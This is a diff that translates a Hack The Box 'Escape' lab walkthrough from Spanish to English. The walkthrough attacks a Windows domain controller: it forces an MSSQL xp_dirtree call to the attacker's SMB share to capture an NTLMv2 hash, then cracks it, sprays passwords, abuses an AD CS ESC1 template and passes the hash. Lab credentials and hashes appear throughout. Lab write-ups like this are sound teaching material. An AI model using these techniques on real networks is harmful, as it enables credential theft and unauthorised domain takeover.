@@ -2,7 +2,7 @@
 
 # Enumeration
 
->Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:
+>We'll start with a port scan using the automatic TCP port scan script I've created:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -113,7 +113,7 @@ Puertos TCP abiertos:
 
 ```
 
-> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:
+> Let's list the Windows version and the Active Directory domain using crackmapexec:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -121,14 +121,14 @@ Puertos TCP abiertos:
 SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
 ```
 
-> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:
+> Let's add the domain to our local host file (/etc/hosts) so that it can resolve the domain name:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
 └─$ echo "10.129.228.253 DC.sequel.htb sequel.htb" >> /etc/hosts
 ```
 
->Si listamos los shares disponibles por SMB empleando inicio de sesión anónimo vemos las siguientes:
+>If we list the shares available via SMB using anonymous login, we see the following:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -145,7 +145,7 @@ Password for [WORKGROUP\]:
         SYSVOL          Disk      Logon server share
 ```
 
->Si nos conectamos a la share Public vemos un pdf interesante sobre procedimientos de SQL, por lo que vamos a descargarlo:
+>If we connect to the Public share, we'll see an interesting PDF on SQL procedures, so let's download it:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -162,14 +162,15 @@ smb: \> get "SQL Server Procedures.pdf"
 getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (94.0 KiloBytes/sec) (average 94.0 KiloBytes/sec)
 ```
 
->Abrimos el pdf con evince:
+>We open the PDF with evince:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
 └─$ evince SQL\ Server\ Procedures.pdf
 ```
 
->Aquí vemos unas credenciales para iniciar sesión en el MSSQL: `PublicUser:GuestUserCantWrite1`
+>Here are the login credentials for MSSQL:
+`PublicUser:GuestUserCantWrite1`
 
 ```
 Bonus
@@ -178,7 +179,7 @@ user PublicUser and password GuestUserCantWrite1 .
 Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication"
 ```
 
->Vamos a probarlas para conectarnos al MSSQL empleando la herramienta de impacket mssqlclient y vemos que podemos entrar:
+>Let's try them out to connect to MSSQL using the impacket mssqlclient tool and see if we can log in:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -196,7 +197,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 SQL (PublicUser  guest@master)> 
 ```
 
->Vemos que no podemos ni habilitar ni emplear xp_cmdshell para ejecutar comandos en la máquina siendo este usuario:
+>We can see that we are unable to enable or use xp_cmdshell to run commands on the machine whilst logged in as this user:
 
 ```bash
 SQL (PublicUser  guest@master)> enable_xp_cmdshell
@@ -208,7 +209,7 @@ SQL (PublicUser  guest@master)> xp_cmdshell "whoami"
 ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
 ```
 
->Vamos a enumerar las bases de datos:
+>Let's list the databases:
 
 ```sql
 SQL (PublicUser  guest@master)> select name from master.dbo.sysdatabases
@@ -223,7 +224,7 @@ model
 msdb
 ```
 
->Ninguna de estas bases de datos posee datos interesantes para movernos lateralmente por lo que vamos a tratar de robar el hash NTLMv2 del usuario que corre el servicio MSSQL, para ello, primero vamos a crear una share de SMB:
+>None of these databases contain any useful information for lateral movement, so we are going to try to steal the NTLMv2 hash of the user running the MSSQL service. To do this, we will first create an SMB share:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -237,7 +238,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 ```
 
->Posteriormente, hacemos una llamada al share para capturar el hash del usuario al tratar de autenticarse sobre mi share:
+>Next, we call the share to capture the user’s hash when they attempt to authenticate on my share:
 
 ```bash
 SQL (PublicUser  guest@msdb)> EXEC master..xp_dirtree '\\10.10.14.177\share\'
@@ -245,7 +246,7 @@ subdirectory   depth
 ------------   -----
 ```
 
->Si ahora vamos al servidor SMB, podemos ver que obtuvimos el hash NTLMv2 del usuario sql_svc:
+>If we now go to the SMB server, we can see that we have obtained the NTLMv2 hash for the user sql_svc:
 
 ```bash
 [*] Incoming connection (10.129.228.253,59537)
@@ -255,7 +256,7 @@ subdirectory   depth
 [*] Closing down connection (10.129.228.253,59537)
 ```
 
->Vamos a tratar de crackear el hash empleando hashcat con la máscara 5600 que corresponde a los hashes NTLMv2, obteniendo las credenciales: `sql_svc:REGGIE1234ronnie`
+>Let's try to crack the hash using hashcat with the 5600 mask, which corresponds to NTLMv2 hashes, to retrieve the credentials: `sql_svc:REGGIE1234ronnie`
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -267,7 +268,7 @@ hashcat (v6.2.6) starting
 SQL_SVC::sequel:aaaaaaaaaaaaaaaa:6ac53771c407cd6ccf958a73df98a0c0:010100000000000000a871dbabb3db01de0caa5c5e58cb1200000000010010004d00740050004f0070004c0048006900030010004d00740050004f0070004c00480069000200100064004e005a004e0058005a0045006d000400100064004e005a004e0058005a0045006d000700080000a871dbabb3db010600040002000000080030003000000000000000000000000030000050851aa016fd083d38a7d2546419681c74a48969cdaa360824e20654e6fe51700a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370037000000000000000000:REGGIE1234ronnie
 ```
 
->Vamos a ver si son válidas en el DC, por lo que podemos ver, lo son, así que antes de nada vamos a obtener una lista de usuarios del dominio para ver si alguno posee la misma contraseña:
+>Let's see if they're valid in the DC; from what we can see, they are, so first of all let's get a list of users in the domain to see if any of them have the same password:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -276,7 +277,7 @@ SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019
 SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie
 ```
 
->Obtenemos una lista de usuarios:
+>We retrieve a list of users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -295,7 +296,7 @@ SMB         10.129.228.253  445    DC               sequel.htb\Guest            
 SMB         10.129.228.253  445    DC               sequel.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
 ```
 
->Tratamos el texto para quedarnos solo con los usuarios:
+>We processed the text to retain only the users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -311,7 +312,7 @@ Guest
 Administrator
 ```
 
->Ahora realizamos el Password Spray para ver si algún usuario posee esa contraseña, por lo que vemos, ninguno la posee:
+>We're now running the Password Spray to see if any user has that password; as far as we can tell, none of them do:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -328,7 +329,7 @@ SMB         10.129.228.253  445    DC               [-] sequel.htb\Guest:REGGIE1
 SMB         10.129.228.253  445    DC               [-] sequel.htb\Administrator:REGGIE1234ronnie STATUS_LOGON_FAILURE
 ```
 
->Vamos a enumerar mediante el collector bloodhound-python empleando estas credenciales encontradas el dominio para poder analizarlo con Bloodhound:
+>Let’s use the Bloodhound-Python collector to list the domain using these credentials we’ve found, so that we can analyse it with Bloodhound:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -355,14 +356,14 @@ INFO: Querying computer: dc.sequel.htb
 INFO: Done in 00M 17S
 ```
 
->Abrimos bloodhound y ejecutamos la base de datos neo4j, importando los archivos resultantes del comando anterior:
+>We open Bloodhound and run the Neo4j database, importing the files generated by the previous command:
 
 ```bash
 bloodhound &>/dev/null & disown
 sudo neo4j start
 ```
 
->Aquí podemos ver que el usuario es miembro del grupo Remote Management Users que podemos abusar para obtener una shell en el DC mediante WinRM:
+>Here we can see that the user is a member of the Remote Management Users group, which we can exploit to gain a shell on the DC via WinRM:
 
 ![image](https://github.com/user-attachments/assets/c7ed2bad-538f-4b37-a36b-34f584edc044)
 
@@ -377,7 +378,7 @@ Evil-WinRM shell v3.7
 *Evil-WinRM* PS C:\Users\sql_svc\Documents>
 ```
 
->Si enumeramos el sistema, vemos lo que pueden ser unas credenciales en un backup de unos logs de MSSQL:
+>If we list the system, we can see what the credentials might look like in a backup of some MSSQL logs:
 
 ```powershell
 *Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK
@@ -390,7 +391,7 @@ Evil-WinRM shell v3.7
 
 ```
 
->Vamos a probar las credenciales y vemos que son válidas:
+>Let's test the credentials and see if they're valid:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -399,7 +400,7 @@ SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019
 SMB         10.129.228.253  445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3
 ```
 
->Vemos que este usuario también es miembro del grupo Remote Management Users por lo que nos conectamos mediante evil-winrm al DC, donde podemos ver la flag user.txt:
+>We can see that this user is also a member of the Remote Management Users group, so we connect to the DC via evil-winrm, where we can view the user.txt flag:
 
 ![image](https://github.com/user-attachments/assets/1d569e84-7b0a-4fc4-b9fe-574afc074098)
 
@@ -422,7 +423,7 @@ Mode                LastWriteTime         Length Name
 
 # Privilege Escalation
 
->Como este usuario, vamos a tratar de enumerar si hay vulnerabilidades en el servicio Active Directory Certification Services (AD CS), empleando certipy:
+>Like this user, we are going to try to identify whether there are any vulnerabilities in the Active Directory Certification Services (AD CS), using certipy:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -443,7 +444,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved JSON output to '20250422215504_Certipy.json'
 ```
 
->Si abrimos el archivo resultante vemos que es vulnerable a ataques ECS1:
+>If we open the resulting file, we can see that it is vulnerable to ESC1 attacks:
 
 ```JSON
 "[!] Vulnerabilities": {
@@ -451,16 +452,16 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
       }
 ```
 
->Además, nos brinda la siguiente información, valiosa para el ataque:
+>Furthermore, it provides us with the following information, which is valuable for the attack:
 
 ```
 "CA Name": "sequel-DC-CA"
 "Template Name": "UserAuthentication"
 ```
 
->Aprovecharemos esta vulnerabilidad para escalar privilegios pidiendo un certificado pfx del usuario administrador para así poder impersonarlo al obtener su hash NTLM y ganar acceso a este.
+>We will exploit this vulnerability to escalate privileges by requesting a PFX certificate from the administrator user, so that we can impersonate them by obtaining their NTLM hash and gaining access to their account.
 
->Para ello, pediremos el certificado del usuario administrador empleando la template vulnerable:
+>To do this, we will request the administrator’s certificate using the vulnerable template:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -475,7 +476,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
->Ahora nos autenticaremos empleando el certificado pfx generado del anterior comando, para obtener el hash NTLM del usuario administrador:
+>We will now authenticate using the PFX certificate generated by the previous command, in order to obtain the administrator’s NTLM hash:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
@@ -490,7 +491,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
 
->Una vez teniendo este hash NTLM podemos hacer un Pass-The-Hash para obtener una shell mediante el servicio WinRM como el usuario administrador, pudiendo ver la flag root.txt:
+>Once we have this NTLM hash, we can perform a Pass-The-Hash attack to gain a shell via the WinRM service as the administrator user, allowing us to view the root.txt flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escape]
